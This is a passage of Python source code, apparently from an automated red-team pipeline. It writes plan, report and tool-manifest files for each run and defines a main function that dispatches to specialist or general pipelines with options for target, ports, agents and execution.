    run_dir = RUNS_DIR / f"run_{artifact_run_id:04d}"
    run_dir.mkdir(parents=True, exist_ok=True)
    plan_path = run_dir / "red_team_plan.json"
    plan_path.write_text(json.dumps(deterministic_plan, indent=2), encoding="utf-8")
    report_path = run_dir / "red_team_report.md"
    report_path.write_text(report, encoding="utf-8")
    used_path = run_dir / "red_team_used.json"
    used = {
        "agents": agents_used,
        "tools": tools_used,
        "scripts": tool_artifacts["manifest"]["scripts"],
        "metasploit_resource": tool_artifacts["manifest"]["metasploit_resource"],
        "specialists": deterministic_plan.get("specialists", {}),
        "artifacts": {
            "run_dir": str(run_dir),
            "red_team_plan": str(plan_path),
            "red_team_report": str(report_path),
            "red_team_tools_manifest": str(tool_artifacts["manifest_path"]),
            "current_red_team_tools": str(tool_artifacts["current_tools_dir"]),
        },
    }
    if execution:
        used["artifacts"]["execution_results"] = execution["results_path"]
    if use_agents:
        used["artifacts"]["specialist_outputs"] = str(specialist_path)
    used_path.write_text(json.dumps(used, indent=2), encoding="utf-8")

    # Also write the common artifact files so this run looks like the threat-intel runs.
    build_run_artifacts(
        0,
        artifact_run_id,
        target,
        ports,
        "complete",
        scan,
        service_summary,
        vulnerability_output,
        report,
        "Red-team remediation is intentionally not generated by this pipeline.",
        nmap_output,
    )

    return {
        "status": "complete",
        "artifact_run_id": artifact_run_id,
        "target": target,
        "ports": ports,
        "candidate_count": deterministic_plan["candidate_count"],
        "execute": execute,
        "agents_used": agents_used,
        "tools_used": tools_used,
        "artifacts": used["artifacts"],
        "execution": execution,
        "plan": deterministic_plan,
    }


def main() -> None:
    args = parse_args()
    if args.domain:
        result = run_red_team_specialist_pipeline(
            domain=args.domain,
            target=args.target,
            ports=args.ports,
            timeout=args.timeout,
            reuse_scan=args.reuse_scan,
            use_nmap_agent=not args.no_nmap_agent,
            use_llm_agent=args.use_agents,
            execute=args.execute,
            execution_timeout=args.execution_timeout,
        )
    else:
        result = run_red_team_pipeline(
            target=args.target,
            ports=args.ports,
            timeout=args.timeout,
            reuse_scan=args.reuse_scan,
            use_agents=args.use_agents,
            execute=args.execute,
            execution_timeout=args.execution_timeout,
        )
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
